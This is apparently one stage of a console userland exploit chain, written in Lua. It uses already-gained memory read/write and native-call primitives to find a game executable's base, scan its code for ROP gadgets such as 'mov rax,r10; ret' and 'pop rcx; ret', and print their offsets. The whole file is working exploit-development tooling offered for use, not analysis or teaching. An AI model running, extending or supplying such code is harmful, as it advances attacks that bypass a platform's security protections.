-- CRASH_CLASS: LOW
-- PROBE 91l: Scan eboot for R10 gadgets
--
-- Need: a way to read R10 from child thread.
-- Search for:
--   4C 89 D0 C3  = mov rax,r10; ret (4 bytes)
--   49 92 C3     = xchg rax,r10; ret (3 bytes)
--   41 52 58 C3  = push r10; pop rax; ret (4 bytes)
--   4C 89 17 C3  = mov [rdi],r10; ret (4 bytes)
--   59 C3        = pop rcx; ret (2 bytes) — for stub workaround
-- Also: search for mov r10,rcx patterns near SA/stub
--
-- Uses 91c's proven scan method: dword reads at 4-byte step,
-- extract bytes, check patterns within and across boundaries.

print("=== PROBE 91l: R10 GADGET SCAN ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end

local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local ebase=uint64(string.format("0x%X%08X",ehi,elo))
local text_sz=rd(inf+0x110) or 0
if text_sz<0 then text_sz=text_sz+0x100000000 end
print("eboot="..string.format("0x%X%08X",ehi,elo).." sz="..string.format("0x%X",text_sz))

local results={}
local max_each=3
local p2=nil; local p3=nil

local function found(name,off)
    if not results[name] then results[name]={} end
    if #results[name]<max_each then
        table.insert(results[name],off)
    end
end

local scan_lim=math.min(text_sz,0x500000)
local chunk=0x40000

print("")
print("--- SCANNING ---")

for base_off=0,scan_lim-1,chunk do
    local end_off=math.min(base_off+chunk-1,scan_lim-4)
    local crashed=false

    for soff=base_off,end_off,4 do
        local v=rd(ebase+soff)
        if not v then crashed=true; break end
        local b0=v%256
        local b1=math.floor(v/256)%256
        local b2=math.floor(v/65536)%256
        local b3=math.floor(v/16777216)%256

        -- =============================
        -- Cross-boundary patterns (using p2,p3 from previous dword)
        -- =============================

        -- 2-byte: 59 C3 (pop rcx; ret)
        if p3 and p3==0x59 and b0==0xC3 then found("pop_rcx",soff-1) end

        -- 3-byte: 49 92 C3 (xchg rax,r10; ret)
        if p2 and p3 and p2==0x49 and p3==0x92 and b0==0xC3 then found("xchg_r10",soff-2) end
        if p3 and p3==0x49 and b0==0x92 and b1==0xC3 then found("xchg_r10",soff-1) end

        -- 4-byte spanning: 4C 89 D0 C3 (mov rax,r10; ret)
        -- starts at -3: p3(prev b3)=4C, b0=89, b1=D0, b2=C3
        if p3 and p3==0x4C and b0==0x89 and b1==0xD0 and b2==0xC3 then found("mov_rax_r10",soff-1) end

        -- 4-byte spanning: 41 52 58 C3 (push r10; pop rax; ret)
        if p3 and p3==0x41 and b0==0x52 and b1==0x58 and b2==0xC3 then found("push_r10_pop_rax",soff-1) end

        -- 4-byte spanning: 4C 89 17 C3 (mov [rdi],r10; ret)
        if p3 and p3==0x4C and b0==0x89 and b1==0x17 and b2==0xC3 then found("mov_rdi_r10",soff-1) end

        -- =============================
        -- Within-dword patterns
        -- =============================

        -- 2-byte: 59 C3 (pop rcx; ret)
        if b0==0x59 and b1==0xC3 then found("pop_rcx",soff) end
        if b1==0x59 and b2==0xC3 then found("pop_rcx",soff+1) end
        if b2==0x59 and b3==0xC3 then found("pop_rcx",soff+2) end

        -- 3-byte: 49 92 C3 (xchg rax,r10; ret)
        if b0==0x49 and b1==0x92 and b2==0xC3 then found("xchg_r10",soff) end
        if b1==0x49 and b2==0x92 and b3==0xC3 then found("xchg_r10",soff+1) end

        -- 4-byte: 4C 89 D0 C3 (mov rax,r10; ret)
        if b0==0x4C and b1==0x89 and b2==0xD0 and b3==0xC3 then found("mov_rax_r10",soff) end

        -- 4-byte starting at +1: need b1..b3 + next b0 → cross-boundary, handled in next iteration

        -- 4-byte: 41 52 58 C3 (push r10; pop rax; ret)
        if b0==0x41 and b1==0x52 and b2==0x58 and b3==0xC3 then found("push_r10_pop_rax",soff) end

        -- 4-byte: 4C 89 17 C3 (mov [rdi],r10; ret)
        if b0==0x4C and b1==0x89 and b2==0x17 and b3==0xC3 then found("mov_rdi_r10",soff) end

        -- Also look for patterns starting at byte 1 of this dword
        -- 4C at b1: 4C 89 D0 at b1,b2,b3 → needs next dword's b0 for C3
        -- This cross-boundary case is handled at the TOP when we process next dword

        p2=b2; p3=b3
    end

    local cnt=0
    for _,t in pairs(results) do cnt=cnt+#t end
    print("  +"..string.format("0x%X",base_off).." "..cnt.." finds")

    if crashed then print("  READ FAIL"); break end
end

-- ============================================================
-- Results
-- ============================================================
print("")
print("--- RESULTS ---")
local names={"mov_rax_r10","xchg_r10","push_r10_pop_rax","mov_rdi_r10","pop_rcx"}
for _,name in ipairs(names) do
    local r=results[name]
    if r and #r>0 then
        local s=""
        for _,off in ipairs(r) do s=s..string.format("+0x%X ",off) end
        print("  "..name..": "..s)
    else
        print("  "..name..": NOT FOUND")
    end
end

-- Verify first hit of each with byte dump
print("")
print("--- VERIFY ---")
local function read_byte_at(off)
    local aligned=off-off%4
    local v=rd(ebase+aligned)
    if not v then return nil end
    local shift=off%4
    if shift==0 then return v%256
    elseif shift==1 then return math.floor(v/256)%256
    elseif shift==2 then return math.floor(v/65536)%256
    else return math.floor(v/16777216)%256 end
end

for _,name in ipairs(names) do
    local r=results[name]
    if r and #r>0 then
        local off=r[1]
        local bytes=""
        for i=0,5 do
            local b=read_byte_at(off+i)
            if b then bytes=bytes..string.format("%02X ",b) else bytes=bytes.."?? " end
        end
        print("  "..name.." +"..string.format("0x%X",off)..": "..bytes)
    end
end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91l DONE ===")
